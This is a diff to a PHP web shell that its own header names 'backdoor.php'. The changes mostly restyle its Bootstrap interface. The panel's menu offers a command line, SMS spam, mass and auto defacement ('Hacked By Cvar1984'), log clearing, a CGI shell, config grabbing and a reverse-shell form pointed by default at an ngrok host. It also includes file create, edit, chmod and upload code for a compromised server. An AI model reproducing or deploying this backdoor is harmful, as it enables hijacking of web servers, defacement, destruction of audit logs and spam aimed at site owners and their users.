@@ -1,4 +1,5 @@
 <?php
+
 /*
  * backdoor.php
  *
@@ -117,128 +118,188 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
-	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
-	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 	<style type='text/css'>
-	body {
-		background: black;
-		color: lavender;
-		text-shadow: 2px 2px 4px #000000;
-		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
-		-webkit-background-size: cover;
-		-moz-background-size: cover;
-		-o-background-size: cover;
-		background-size: cover;
-	}
-
-	@font-face {
-		font-family: 'Orbitron';
-		font-style: normal;
-		font-weight: 700;
-		src: local('Orbitron Bold'), local('Orbitron-Bold'),
-		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
-		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
-		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
-		U+2212, U+2215, U+FEFF, U+FFFD;
-	}
-
-	li {
-		display: inline;
-		text-shadow: 2px 2px 4px #000000;
-		font-size: 17px;
-	}
-
-	a {
-		color: lime;
-	}
-
-	a:hover {
-		color: black;
-	}
-
-	table,
-	tr,
-	td {
-		border: 1px solid green;
-		-webkit-border: 1px;
-		-moz-border: 1px;
-		-o-border: 1px;
-	}
-
-	table {
-		-webkit-width:800px;
-		-moz-width:800px;
-		-o-width:800px;
-		-webkit-height:auto;
-		-moz-height:auto;
-		-o-height:auto;
-		width:800px;
-		height:auto;
-	}
-
-	th {
-		background:green;
-		padding:7px;
-		text-align:center;
-	}
-
-	nav {
-
-	}
-
-	.table-hover {
-		border: 1px solid green;
-		cellpadding: 3;
-		cellspacing: 3;
-		font-size: 15px;
-	}
-
-	#textarea {
-		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
-		-webkit-background-size: cover;
-		-moz-background-size: cover;
-		-o-background-size: cover;
-		background-size: cover;
-		width: 1066px;
-		height: 500px;
-		font-family: Arial, Helvetica, monospace;
-		border: 1px solid lime;
-	}
-
-	#input {
-		background: transparent;
-		width: 250px;
-		font-family: Arial, Helvetica, monospace;
-		color: lavender;
-		border: 1px solid lime;
-	}
-
-	#menu {}
-
-	* {
-		font-family: 'Orbitron';
-	}
-
-	.icon {
-		width: 20px;
-		height: 20px;
-	}
-	.iframe {
-		-webkit-width: 100vw;
-		-moz-width: 100vw;
-		-o-width: 100vw;
-		width: 100vw;
-		height: 100vh;
-		position: relative;
-	}
-	span {
-		color:red;
-	}
+		.icon {
+			width:25px;
+			height:25px;
+		}
+		div.table {
+			width:70%;
+			border:none;
+		}
+		th {
+			text-align: center;
+		}
+		table.tool {
+			border:none;
+		}
+		textarea.tool {
+			height:250px;
+		}
+		div.tool {
+			padding:5px;
+		}
+		textarea {
+			resize:none;
+			-moz-border-bottom-colors: none;
+            -moz-border-left-colors: none;
+            -moz-border-right-colors: none;
+            -moz-border-top-colors: none;
+		}
 	</style>
 </head>
 <body>
+	<br>
+	<center>
+	<div class="table table-bordered" align="center">
+<table width="100%" class="tool">
+	<tr>
+		<td>
+		<button style="width:100%;" class="btn btn-success" type="button" data-toggle="collapse" data-target="#collapseExample" aria-expanded="false" aria-controls="collapseExample">Tools</button>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<div class="collapse" id="collapseExample" style="border:none;">
+				<div class="card card-body" style="border:none;">
+					<form method="post">
+					<div class="row">
+						<div class="col tool">
+							<div class="dropdown">
+								<button style="width:100%;" class="btn btn-success dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Choose</button>
+								<div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+									<a class="dropdown-item" href='?do=cmd'>Command Line</a>
+									<a class="dropdown-item" href='?do=sms'>Spam SMS</a>
+									<a class="dropdown-item" href='?do=music'>Music</a>
+									<a class="dropdown-item" href='?do=jumping'>Jumping</a>
+									<a class="dropdown-item" href='?do=config'>Config</a>
+									<a class="dropdown-item" href='?do=mass_deface'>Mass Deface</a>
+									<a class="dropdown-item" href='?do=info'>Server Info</a>
+									<a class="dropdown-item" href='?do=logs'>Clear Logs</a>
+									<a class="dropdown-item" href='?do=cgi'>CGI Shell</a>
+									<a class="dropdown-item" href='?do=deface'>Auto Deface</a>
+									<a class="dropdown-item" href='?do=shortlink'>Shortlink Generator</a>
+									<a class="dropdown-item" href='?do=network'>Network</a>
+								</div>
+							</div>
+						</div>
+				    <div class="w-100"></div>
+				    <div class="col tool">
+						  	<select name="type" class="custom-select">
+				 				<option value="file">File</option>
+				 				<option value="folder">Folder</option>
+				 			</select>
+						  </div>
+				      <div class="col tool">
+						  	<input class="form-control" type="text" name="filename" placeholder="filename.php">
+						  </div>
+					<div class="w-100">
+						<div class="col tool">
+				 			<textarea name="text" class="form-control tool" placeholder="if you want to make the folder empty this textarea"></textarea>
+						  </div>
+					</div>
+					<div class="w-100">
+						<div class="col tool">
+							<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
+						</div>
+					</div>
+				</div></form>
+				      </div>
+				 <?php
+				 if (isset($_POST['submit'])) {
+				 	if ($_POST['type'] == 'file') {
+				 		if (@makefile($_POST['filename'], $_POST['text'])) {
+				 			@alert("Success");
+				 		} else {
+				 			@alert("Failed");
+				 		}
+				 	}
+				 	if ($_POST['type'] == 'folder') {
+				 		if (@makedir($_POST['filename'])) {
+				 			@alert("Success");
+				 		} else {
+				 			@alert("Failed");
+				 		}
+				 	} 
+				 }
+				 ?>
+				</div>
+		</td>
+	</tr>
+</div>
+</table>
+<table class="table" align="center">
 <?php
+function makefile($filename, $text) {
+  $fp = @fopen(@getcwd().$sep.$filename, "w");
+  @fwrite($fp, $text);
+  @fclose($fp);
+}
+function makedir($filename) {
+  return @mkdir(@getcwd().$sep.$filename);
+}
+function perms($file) {
+$perms = fileperms($file);
+switch ($perms & 0xF000) {
+    case 0xC000: // socket
+        $info = 's';
+        break;
+    case 0xA000: // symbolic link
+        $info = 'l';
+        break;
+    case 0x8000: // regular
+        $info = 'r';
+        break;
+    case 0x6000: // block special
+        $info = 'b';
+        break;
+    case 0x4000: // directory
+        $info = 'd';
+        break;
+    case 0x2000: // character special
+        $info = 'c';
+        break;
+    case 0x1000: // FIFO pipe
+        $info = 'p';
+        break;
+    default: // unknown
+        $info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+echo $info;
+}
+function writable($dir, $perms) {
+	if(!is_writable($dir)) {
+		return "<font color=red>".$perms."</font>";
+	} else {
+		return "<font color=green>".$perms."</font>";
+	}
+}
 // FUNCTION
 function post_data($url, $data)
 {
@@ -254,7 +315,6 @@ function post_data($url, $data)
 function home() {
 	echo "<script>window.location='?';</script>";
 }
-
 function hapus($dir)
 {
 	if (is_dir($dir)) {
@@ -781,11 +841,23 @@ function edit($filename)
 	$text = file_get_contents($filename);
 ?>
 <form method="post">
-		<center>
-			<h5>Files Editor : <?php echo $filename; ?></h5>
-			<textarea name="text" class="form-control" id="textarea" cols=""
-				rows=""><?php echo htmlspecialchars($text); ?></textarea>
-			<br> <input type="submit" class="btn btn-danger" />
+	         <thead class="thead-light">
+			<tr>
+				<th>
+					<h5>Filename : <?php echo $filename; ?></h5>
+				</th>
+			</tr>
+		</thead>
+			<tr>
+				<td>
+					<textarea style="height:350px;" name="text" class="form-control" id="textarea" cols="" rows=""><?php echo htmlspecialchars($text); ?></textarea>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input style="width:100%;" type="submit" class="btn btn-success" />
+				</td>
+			</tr>
 		</center>
 	</form>
 <?php
@@ -859,10 +931,23 @@ function renames($filename)
 	}
 ?>
    <form method='post'>
-		<center>
-			<td>Filename : <input type='text' class='input-sm' id='input'
-				value='<?php echo $filename; ?>' name='newname'></td> <input
-				type='submit' class='btn btn-danger' name='action' value='rename'>
+		<tr>
+			<thead class="thead-light">
+				<th>
+					Rename
+				</th>
+			</thead>
+		</tr>
+		<tr>
+			<td>
+				<input type='text' class='form-control' id='input' value='<?php echo $filename; ?>' name='newname'>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<input style="width:100%;" type='submit' class='btn btn-success' name='action' value='rename'>
+			</td>
+		</tr>
 		</center>
 	</form>
 	<?php
@@ -882,11 +967,21 @@ function chmods($filename)
 	}
 ?>
    <form method='post'>
-		<center>
-			<td>Permission : <input type='text' class='input-sm' id='input'
-				value='0755' name='permission'></td> <input type='submit'
-				class='btn btn-danger' name='action' value='chmod'>
-		</center>
+			<tr>
+				<thead class="thead-light">
+					<th>Chmod</th>
+				</thead>
+			</tr>
+			<tr>
+				<td>
+					<input type='text' class='form-control' id='input' value='0755' name='permission'>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input style="width:100%;" type='submit' class='btn btn-success' name='action' value='chmod'>
+				</td>
+			</tr>
 	</form>
 	<?php
 	die();
@@ -996,7 +1091,6 @@ function ngindex()
 ?>
 <center><h2>Auto Deface With Backup</h2></center>
 <form method='post'>
-	<table align="center">
 		<tr>
 			<td>Title</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
@@ -1021,7 +1115,6 @@ function ngindex()
 			<td>Sub Content</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
 			</tr>
-		</table>
 		<center>
 			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
 		</center>
@@ -1064,7 +1157,6 @@ function short_link()
 
 ?>
 <form method='post'>
-	<table align="center">
 		<tr>
 			<td>Link</td>
 			<td>:</td>
@@ -1072,7 +1164,6 @@ function short_link()
 				<input type='text' class='input-sm' id='input' name='link'>
 			</td>
 		</tr>
-	</table>
 	<center>
 		<br />
 		<input type='submit' class='btn btn-danger' name='action'>
@@ -1216,7 +1307,7 @@ function network()
 <center>
 <h2>Reverse Shell</h2>
 <form method='post'>
-	<table align="center">
+
 	<tr>
 		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
 	</tr>
@@ -1230,7 +1321,6 @@ function network()
 			</center>
 		</td>
 	</tr>
-</table>
 </form>
 	<?php
 	die();
@@ -1243,35 +1333,35 @@ function kill()
 }
 // END FUNCTION
 
-?>
-<nav class="navbar navbar-inverse">
-	<div class="container-fluid">
-		<div class="navbar-header">
-			<a class="navbar-brand" href="?do=kill">Fuck Myself</a>
-		</div>
-		<ul class="nav navbar-nav">
-			<li class="active"><a href="?">Home</a></li>
-			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
-				<ul class="dropdown-menu">
-					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Line</a></li>
-					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
-					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
-					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
-					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
-					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
-					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
-					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
-					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
-					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
-					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
-					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
-				</ul>
-			</li>
-			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
-		</ul>
-	</div>
-</nav>
-<?php
+//echo '
+//<nav class="navbar navbar-inverse">
+//	<div class="container-fluid">
+//		<div class="navbar-header">
+//			<a class="navbar-brand" href="?do=kill">Fuck Myself</a>
+//		</div>
+//		<ul class="nav navbar-nav">
+//			<li class="active"><a href="?">Home</a></li>
+//			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
+//				<ul class="dropdown-menu">
+//					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Line</a></li>
+//					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
+//					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
+//					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
+//					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
+//					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
+//					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
+//					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
+//					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
+//					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
+//					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
+//					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
+//				</ul>
+//			</li>
+//			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
+//		</ul>
+//	</div>
+//</nav>';
+
 if (isset($_GET['url'])) {
 	@chdir($_GET['url']);
 }
@@ -1347,24 +1437,22 @@ if (isset($_GET['url'])) {
 		kill();
 	}
 	?>
-	<table width='70%' cellpadding='3' cellspacing='3' align='center'>
+	<thead class="thead-light">
+	<tr>
 	<th>Name</th>
 	<th>Size</th>
 	<th>Permission</th>
 	<th>Action</th>
+</tr>
+</thead>
 	<?php
 foreach (scandir(getcwd()) as $dir) {
 	if(!is_dir($dir)) continue;
-	if ($dir === '.' || $dir === '..') {
-		$tools = "<center>
-		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
-		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . $dir)."'>New Dir</a>";
-	} else {
+	if ($dir === '.' || $dir === '..') continue;
 		$tools = "<center>
 		<a class='btn btn-success btn-xs' href='?do=chmod&url=" .base64_encode(getcwd())."&files=".$dir."'>Chmod</a>
 		<a class='btn btn-success btn-xs' href='?do=rename&url=" .base64_encode(getcwd())."&files=".$dir."'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&url=" .base64_encode(getcwd())."&files=".$dir."'>Delete</a></td>";
-	}
 		echo "<tr><td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'> ";
 		echo " <a href='?url=".@getcwd().$sep.$dir."'>".$dir."</a></td>";
 		echo "<td><center>--</center></td>";
@@ -1372,10 +1460,66 @@ foreach (scandir(getcwd()) as $dir) {
 		echo "".@writable($dir, @perms($dir))."</center></td>";
 		echo "<td>".$tools."</td>";
 	}
-	print("<tr><td colspan='4'></td></tr>");
 	foreach (@scandir(@getcwd()) as $file) {
 		if(!is_file($file)) continue;
-		echo "<tr><td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'> ";
+		echo "<tr><td>";
+		print("<img src='");
+		$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+  if($ext == "php"){
+    echo 'https://image.flaticon.com/icons/png/128/337/337947.png'; 
+  } elseif ($ext == "html"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136528.png';
+    } elseif ($ext == "css"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136527.png';
+    } elseif ($ext == "png"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136523.png';
+    } elseif ($ext == "jpg"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136524.png';
+    } elseif ($ext == "jpeg"){
+      echo 'http://i.imgur.com/e8mkvPf.png"';
+    } elseif($ext == "zip"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136544.png';
+    } elseif ($ext == "js"){
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
+    } elseif ($ext == "ttf"){
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
+    } elseif ($ext == "otf"){
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
+    } elseif ($ext == "txt"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
+    } elseif ($ext == "ico"){
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
+    } elseif ($ext == "conf"){
+      echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
+    } elseif ($ext == "htaccess"){
+      echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
+    } elseif ($ext == "sh"){
+      echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
+    } elseif ($ext == "py"){
+      echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
+    } elseif ($ext == "indsc"){
+      echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
+    } elseif ($ext == "sql"){
+      echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
+    } elseif ($ext == "pl"){
+      echo 'http://i.imgur.com/PnmX8H9.png';
+    } elseif ($ext == "pdf"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
+    } elseif ($ext == "mp4"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
+    } elseif ($ext == "mp3"){
+      echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
+    } elseif ($ext == "git"){
+      echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
+    } elseif ($ext == "md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+  } else {
+    echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
+  } print("' class='icon'></img>");
+  if (strlen($file) > 25){
+    $_file = substr($file, 0, 25)."...-.".$ext;                       
+  } else {
+    $_file = $file;          
+  }
 		echo " <a href='?do=edit&url=".base64_encode(getcwd())."&files=".$file."'>$file</a></td>";
 		echo "<td><center>".@size($file)."</center></td>";
 		echo "<td><center>";
@@ -1385,76 +1529,18 @@ foreach (scandir(getcwd()) as $dir) {
 		<a class='btn btn-success btn-xs' href='?do=rename&files=".base64_encode(getcwd() . $sep . $file)."'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&files=".base64_encode(getcwd() . $sep . $file)."'>Delete</td>";
 	}
-function perms($file) {
-$perms = fileperms($file);
-switch ($perms & 0xF000) {
-    case 0xC000: // socket
-        $info = 's';
-        break;
-    case 0xA000: // symbolic link
-        $info = 'l';
-        break;
-    case 0x8000: // regular
-        $info = 'r';
-        break;
-    case 0x6000: // block special
-        $info = 'b';
-        break;
-    case 0x4000: // directory
-        $info = 'd';
-        break;
-    case 0x2000: // character special
-        $info = 'c';
-        break;
-    case 0x1000: // FIFO pipe
-        $info = 'p';
-        break;
-    default: // unknown
-        $info = 'u';
-}
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
-            (($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
-            (($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
-            (($perms & 0x0200) ? 'T' : '-'));
-
-echo $info;
-}
-function writable($dir, $perms) {
-	if(!is_writable($dir)) {
-		return "<font color=red>".$perms."</font>";
-	} else {
-		return "<font color=green>".$perms."</font>";
-	}
-}
 ?>
 	</tr>
-	</table>
-<table width='70%' cellpadding='3' cellspacing='3' align='center'
-		style='background: green;'>
-		<th style='padding: 5px;' colspan='2'>
+	<thead class="thead-light">
+		<tr>
+			<th colspan='4'>
 			<center>
 			Copyright &copy <?php echo date("Y"); ?>, 
 			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
 			</center>
 		</th>
-	</table>
+	</tr>
+</thead>
 	<?php
 if (isset($_POST['upl'])) {
 	if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
@@ -1464,12 +1550,20 @@ if (isset($_POST['upl'])) {
 		alert("Upload Failed");
 	}
 }
+//echo "
+//<thead class="thead-light">
+//<tr>
+//	<th colspan="4">
+//	<form method="post" enctype="multipart/form-data">
+//		<center>
+//			<input class="btn" type="file" name="file" />
+//			<input class="btn btn-danger" name="upl" type="submit" value="Save">
+//		</center>
+//	</form>
+//</th>
+//</tr>
+//</thead> ";
 ?>
-	<form method="post" enctype="multipart/form-data">
-		<center>
-			<input class="btn" type="file" name="file" />
-			<input class="btn btn-danger" name="upl" type="submit" value="Save">
-		</center>
-	</form>
+</table>
 </body>
 </html>
